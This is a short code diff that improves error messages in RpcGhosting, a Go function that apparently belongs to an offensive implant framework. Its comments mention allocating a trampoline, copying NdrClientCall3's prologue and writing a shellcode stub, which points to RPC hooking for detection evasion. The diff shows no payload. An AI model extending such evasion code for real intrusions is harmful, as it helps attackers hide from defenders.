@@ -201,7 +201,8 @@ func RpcGhosting() error {
 		//{{if .Config.Debug}}
 		log.Printf("[RpcGhosting] trampoline VirtualAlloc failed: %v\n", allocErr)
 		//{{end}}
-		return errors.New("trampoline allocation failed")
+		// allocErr is used unconditionally so non-debug builds keep the variable live
+		return errors.New("trampoline allocation failed: " + allocErr.Error())
 	}
 
 	// Copy 12 bytes from NdrClientCall3's prologue into the trampoline.
@@ -230,7 +231,7 @@ func RpcGhosting() error {
 		//{{if .Config.Debug}}
 		log.Printf("[RpcGhosting] stub VirtualAlloc failed: %v\n", allocErr)
 		//{{end}}
-		return errors.New("stub allocation failed")
+		return errors.New("stub allocation failed: " + allocErr.Error())
 	}
 
 	// Write the stub shellcode template.
